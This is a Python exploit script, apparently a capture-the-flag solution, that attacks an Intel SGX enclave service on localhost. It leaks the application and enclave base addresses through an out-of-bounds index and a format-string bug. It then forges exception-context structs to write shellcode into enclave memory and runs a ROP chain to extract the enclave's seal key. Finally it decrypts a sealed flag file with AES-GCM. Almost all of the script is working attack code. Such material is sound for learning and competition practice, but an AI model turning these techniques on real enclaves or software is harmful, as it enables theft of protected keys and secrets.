import struct
from helper import *
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)

# context.log_level = "debug"

afill = lambda n: b'a' * n
getkey_shellcode = asm(shellcode)
log.info("shellcode length: %d" % len(getkey_shellcode))
sh = remote("127.0.0.1", 10000)

def sgx_exception_info_t(rax=0, rcx=0, rdx=0, rbx=0, rsp=0, rbp=0, rsi=0, rdi=0, rip=0, r8=0, r9=0) -> bytes:
    r10_2_r15 = (0,) * 6
    return struct.pack("18Q", rax, rcx, rdx, rbx, rsp, rbp, rsi, rdi, r8, r9, *r10_2_r15, 0x202, rip)

def mem_align(address: int, boundary: int) -> int:
    return address + boundary - address % boundary

def leak_address(idx: int) -> int:
    sh.sendlineafter(b"room.\n", b'1')
    sleep(0.5)
    sh.sendline(str(idx).encode())
    address = int(sh.recvline().split(b": ", 1)[-1][:-1], 16)
    sleep(0.5)
    sh.sendline(b'')
    return address

def leak_enclave_base() -> int:
    sh.sendlineafter(b"room.\n", b'2')
    sleep(0.5)
    sh.sendline(b"%9$p\n\x00")
    sh.recvuntil(b"Welcome back ")
    return int(sh.recvuntil(b"please", drop=True).strip(), 16)

def write_chain(payload: str) -> None:
    sh.sendlineafter(b"room.\n", b'5')
    for i in range(0, len(payload), 0x100):
        sleep(0.2)
        sh.send(payload[i:i+0x100])
    sleep(0.5)
    sh.send(b'n')

def launch_chain(payload: str) -> None:
    sh.sendlineafter(b"room.\n", b'4')
    sleep(0.5)
    sh.sendline(payload)

app_fn = AppFuncHelper(binary_path="./basic_guide")
enclave_fn = EnclaveFuncHelper(binary_path="./cases.signed.so")

app_base = leak_address(-1) - app_fn.main
log.info("app base: " + hex(app_base))
app_fn.set_base(app_base)

fake_heap = leak_address(-2)
log.info("fake structs heap: " + hex(fake_heap))

enclave_base = leak_enclave_base() - enclave_fn.do_output_ret_off
log.info("enclave base: " + hex(enclave_base))
enclave_fn.set_base(enclave_base)

enclave_gadget = GadgetHelper(binary_path="./cases.signed.so", base=enclave_base)

sizeof_sgx_exception_info_t = 18 * 8
structs = b''
for i in range((len(getkey_shellcode) + 3) // 4):
    piece = getkey_shellcode[i*4:(i+1)*4].ljust(4, b'\x00')
    structs += sgx_exception_info_t(
        rax=struct.unpack("I", piece)[0],
        rcx=enclave_base + 0x2000 + i * 4,  # code segment
        rsp=fake_heap + 0x1088 + i * sizeof_sgx_exception_info_t,
        rdi=fake_heap + (i + 1) * sizeof_sgx_exception_info_t,
        rip=enclave_gadget.write_mem_4
    )

key_data = enclave_base + 0xa6000
key_request = enclave_base + 0xa6200
structs += sgx_exception_info_t(
    rax=0,
    rbx=key_request,
    rcx=512,
    rdx=key_data,
    rsi=fake_heap + 0xA00,
    rdi=key_request,
    rsp=fake_heap + 0x1600,  # rsp - 0x88 should be writable
    rbp=fake_heap + 0x1600,
    r8=app_fn.puts,
    r9=app_base + 0xA300,
    rip=enclave_base + 0x2000
)
assert len(structs) < 0xA00
structs = structs.ljust(0xA00, b'\x00')
structs += open("flag", 'rb').read()[:512]
structs = structs.ljust(0x1000, b'\x00')
structs += (0x1000 // 8) * p64(enclave_fn.continue_execution)
write_chain(structs)

payload = flat([afill(0x18), enclave_gadget.pop_rdi, fake_heap, enclave_fn.continue_execution])
launch_chain(payload)

seal_key = sh.recv(16)
log.info("seal key: " + seal_key.hex())

# decode flag
with open("flag", "rb") as f:
    sealed_data = f.read()

encrypt_txt_len = struct.unpack("I", sealed_data[0x200:0x200+4])[0]  # (sgx_sealed_data_t*)->plain_text_offset
payload_size = struct.unpack("I", sealed_data[0x210:0x210+4])[0]     # (sgx_sealed_data_t*)->aes_data.payload_siz
add_mac_txt_len = payload_size - encrypt_txt_len
payload_tag = sealed_data[0x220:0x230]
payload = sealed_data[0x230:0x230+payload_size]  # (sgx_sealed_data_t*)->aes_data.payload

encrypt_txt = payload[:-add_mac_txt_len]
add_mac_txt = payload[-add_mac_txt_len:]

iv = b'\x00' * 12
aes_gcm = Cipher(algorithms.AES(seal_key), modes.GCM(iv), backend=default_backend()).decryptor()
plain = aes_gcm.update(encrypt_txt)
log.info("cipher: " + encrypt_txt.hex())
log.success("plain: " + plain.decode())
